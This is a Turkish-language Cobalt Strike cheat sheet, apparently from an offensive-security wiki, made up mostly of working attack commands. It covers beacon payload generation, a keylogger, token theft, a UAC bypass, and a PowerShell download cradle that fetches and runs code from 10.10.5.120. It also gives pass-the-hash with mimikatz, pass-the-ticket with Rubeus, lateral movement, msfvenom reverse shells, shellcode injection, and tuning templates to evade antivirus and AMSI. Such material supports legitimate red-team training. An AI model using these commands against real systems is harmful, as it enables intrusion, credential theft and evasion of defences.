# Cobalt Strike

### Dinleyiciler

### C2 Dinleyicileri

`Cobalt Strike -> Dinleyiciler -> Ekle/Düzenle` ardından dinlemek için yeri seçebilir, hangi tür beacon kullanacağınızı (http, dns, smb...) ve daha fazlasını belirleyebilirsiniz.

### Peer2Peer Dinleyicileri

Bu dinleyicilerin beacon'ları doğrudan C2 ile konuşmak zorunda değildir, diğer beacon'lar aracılığıyla iletişim kurabilirler.

`Cobalt Strike -> Dinleyiciler -> Ekle/Düzenle` ardından TCP veya SMB beacon'larını seçmeniz gerekir.

* **TCP beacon, seçilen portta bir dinleyici ayarlayacaktır**. TCP beacon'a bağlanmak için başka bir beacon'dan `connect <ip> <port>` komutunu kullanın.
* **smb beacon, seçilen isimle bir pipename'de dinleyecektir**. SMB beacon'a bağlanmak için `link [target] [pipe]` komutunu kullanmanız gerekir.

### Payload'ları Oluşturma ve Barındırma

#### Dosyalarda Payload Oluşturma

`Saldırılar -> Paketler ->`

* **`HTMLApplication`** HTA dosyaları için
* **`MS Office Macro`** makro içeren bir ofis belgesi için
* **`Windows Executable`** bir .exe, .dll veya hizmet .exe için
* **`Windows Executable (S)`** **stageless** bir .exe, .dll veya hizmet .exe için (stageless, staged'den daha iyidir, daha az IoC)

#### Payload'ları Oluşturma ve Barındırma

`Saldırılar -> Web Drive-by -> Scripted Web Delivery (S)` Bu, cobalt strike'dan beacon'ı indirmek için bitsadmin, exe, powershell ve python gibi formatlarda bir script/yürütülebilir dosya oluşturacaktır.

#### Payload'ları Barındırma

Eğer barındırmak istediğiniz dosya zaten bir web sunucusunda varsa, `Saldırılar -> Web Drive-by -> Dosya Barındır` kısmına gidin ve barındırılacak dosyayı ve web sunucu yapılandırmasını seçin.

### Beacon Seçenekleri

<pre class="language-bash"><code class="lang-bash"># Yerel .NET ikili dosyasını çalıştır
execute-assembly </path/to/executable.exe>

# Ekran görüntüleri
printscreen    # PrintScr yöntemiyle tek bir ekran görüntüsü al
screenshot     # Tek bir ekran görüntüsü al
screenwatch    # Masaüstünün periyodik ekran görüntülerini al
## Görüntüle -> Ekran Görüntüleri'ne gidin

# keylogger
keylogger [pid] [x86|x64]
## Görüntüle > Tuş Vuruşları'na gidin, basılan tuşları görün

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Başka bir süreç içinde portscan eylemi enjekte et
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Powershell modülünü içe aktar
powershell-import C:\path\to\PowerView.ps1
powershell <buraya powershell komutunu yazın>

# Kullanıcı taklidi
## Kimlik bilgileri ile token oluşturma
make_token [DOMAIN\user] [password] # Ağda bir kullanıcıyı taklit etmek için token oluştur
ls \\computer_name\c$ # Oluşturulan token ile bir bilgisayardaki C$'ya erişmeye çalış
rev2self # make_token ile oluşturulan token'ı kullanmayı durdur
## make_token kullanımı, 4624 olayı oluşturur: Bir hesap başarıyla oturum açtı. Bu olay, bir Windows alanında çok yaygındır, ancak Oturum Açma Türü ile filtrelenerek daraltılabilir. Yukarıda belirtildiği gibi, LOGON32_LOGON_NEW_CREDENTIALS kullanır, bu da tür 9'dur.

# UAC Atlatma
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## pid'den token çalma
## make_token gibi ama bir süreçten token çalıyor
steal_token [pid] # Ayrıca, bu ağ eylemleri için yararlıdır, yerel eylemler için değil
## API belgelerinden, bu oturum açma türünün "çağrıcının mevcut token'ını klonlamasına izin verdiğini biliyoruz". Bu nedenle Beacon çıktısı, Taklit Edilen <current_username> diyor - kendi klonlanmış token'ımızı taklit ediyor.
ls \\computer_name\c$ # Oluşturulan token ile bir bilgisayardaki C$'ya erişmeye çalış
rev2self # steal_token'dan token kullanmayı durdur

## Yeni kimlik bilgileri ile süreci başlat
spawnas [domain\username] [password] [listener] # Okuma erişimi olan bir dizinden yapın: cd C:\
## make_token gibi, bu 4624 olayı oluşturur: Bir hesap başarıyla oturum açtı ama 2 (LOGON32_LOGON_INTERACTIVE) oturum açma türü ile. Çağrıcı kullanıcıyı (TargetUserName) ve taklit edilen kullanıcıyı (TargetOutboundUserName) detaylandıracaktır.

## Sürece enjekte et
inject [pid] [x64|x86] [listener]
## OpSec açısından: Gerçekten gerekmedikçe çapraz platform enjekte etmeyin (örneğin x86 -> x64 veya x64 -> x86).

## Hash'i geç
## Bu modifikasyon süreci, LSASS belleğini yamanmayı gerektirir ki bu yüksek riskli bir eylemdir, yerel yönetici ayrıcalıkları gerektirir ve Korunan Süreç Işık (PPL) etkinse pek uygulanabilir değildir.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Mimikatz ile hash'i geç
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## /run olmadan, mimikatz bir cmd.exe başlatır, eğer bir Masaüstü kullanıcısı olarak çalışıyorsanız, shell'i görecektir (eğer SYSTEM olarak çalışıyorsanız, devam edebilirsiniz)
steal_token <pid> # Mimikatz tarafından oluşturulan süreçten token çal

## Bilet geç
## Bir bilet talep et
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Yeni bilet ile kullanılacak yeni bir oturum açma oturumu oluştur (ele geçirilen birini üzerine yazmamak için)
make_token <domain>\<username> DummyPass
## Bileti saldırgan makinesine bir powershell oturumundan yazın ve yükleyin
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## SYSTEM'den bileti geç
## Bilet ile yeni bir süreç oluştur
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## O süreçten token çal
steal_token <pid>

## Bileti çıkar + Bileti geç
### Biletleri listele
execute-assembly C:\path\Rubeus.exe triage
### LUID ile ilginç bileti dök
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Yeni bir oturum açma oturumu oluştur, luid ve processid not edin
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Bileti oluşturulan oturum açma oturumuna ekle
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Son olarak, o yeni süreçten token çal
steal_token <pid>

# Yanal Hareket
## Bir token oluşturulduysa kullanılacaktır
jump [method] [target] [listener]
## Yöntemler:
## psexec                    x86   Bir hizmeti çalıştırmak için bir Hizmet EXE eseri kullan
## psexec64                  x64   Bir hizmeti çalıştırmak için bir Hizmet EXE eseri kullan
## psexec_psh                x86   Bir hizmeti çalıştırmak için bir PowerShell one-liner kullan
## winrm                     x86   WinRM aracılığıyla bir PowerShell scripti çalıştır
## winrm64                   x64   WinRM aracılığıyla bir PowerShell scripti çalıştır

remote-exec [method] [target] [command]
## Yöntemler:
<strong>## psexec                          Hizmet Kontrol Yöneticisi aracılığıyla uzaktan çalıştır
</strong>## winrm                           WinRM (PowerShell) aracılığıyla uzaktan çalıştır
## wmi                             WMI aracılığıyla uzaktan çalıştır

## WMI ile bir beacon çalıştırmak için (jump komutunda değil) sadece beacon'ı yükleyin ve çalıştırın
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Metasploit'e oturum geçişi - Dinleyici aracılığıyla
## Metasploit ana bilgisayarında
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Cobalt'ta: Dinleyiciler > Ekle ve Payload'u Yabancı HTTP olarak ayarla. Host'u 10.10.5.120, Port'u 8080 olarak ayarlayın ve Kaydet'e tıklayın.
beacon> spawn metasploit
## Yalnızca yabancı dinleyici ile x86 Meterpreter oturumları başlatabilirsiniz.

# Metasploit oturumunu Cobalt Strike'a geçirme - Shellcode enjekte ederek
## Metasploit ana bilgisayarında
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## msfvenom'u çalıştırın ve multi/handler dinleyicisini hazırlayın

## Bin dosyasını Cobalt Strike ana bilgisayarına kopyalayın
ps
shinject <pid> x64 C:\Payloads\msf.bin # x64 süreçte metasploit shellcode enjekte et

# Metasploit oturumunu Cobalt Strike'a geçirme
## Stageless Beacon shellcode oluşturun, Saldırılar > Paketler > Windows Executable (S) kısmına gidin, istenen dinleyiciyi seçin, Çıktı türü olarak Raw'ı seçin ve x64 payload kullanın.
## Oluşturulan cobalt strike shellcode'u enjekte etmek için metasploit'te post/windows/manage/shellcode_inject kullanın.


# Pivoting
## Teamserver'da bir socks proxy açın
beacon> socks 1080

# SSH bağlantısı
beacon> ssh 10.10.17.12:22 kullanıcı adı şifre</code></pre>

## AV'lerden Kaçınma

### Artifact Kit

Genellikle `/opt/cobaltstrike/artifact-kit` içinde, Cobalt Strike'ın ikili beacon'ları oluşturmak için kullanacağı kod ve önceden derlenmiş şablonları ( `/src-common` içinde) bulabilirsiniz.

Oluşturulan arka kapı (veya sadece derlenmiş şablon) ile [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanarak, defender'ı tetikleyen şeyi bulabilirsiniz. Genellikle bir dizedir. Bu nedenle, arka kapıyı oluşturan kodu değiştirerek o dizeyi son ikili dosyada görünmeyecek şekilde değiştirebilirsiniz.

Kodu değiştirdikten sonra, aynı dizinden `./build.sh` komutunu çalıştırın ve `dist-pipe/` klasörünü Windows istemcisinde `C:\Tools\cobaltstrike\ArtifactKit` içine kopyalayın.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Aggressive script `dist-pipe\artifact.cna` dosyasını yüklemeyi unutmayın, böylece Cobalt Strike'ın istediğimiz disk kaynaklarını kullanmasını ve yüklü olanları kullanmamasını belirtebiliriz.

### Resource Kit

ResourceKit klasörü, Cobalt Strike'ın script tabanlı yükleri için PowerShell, VBA ve HTA dahil olmak üzere şablonları içerir.

Şablonlarla birlikte [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanarak, defender'ın (bu durumda AMSI) beğenmediği şeyleri bulabilir ve bunu değiştirebilirsiniz:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Tespit edilen satırları değiştirerek yakalanmayacak bir şablon oluşturabilirsiniz.

Cobalt Strike'a kullanmak istediğimiz kaynakları diskten yüklemesi için `ResourceKit\resources.cna` agresif betiğini yüklemeyi unutmayın, yüklü olanları değil.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

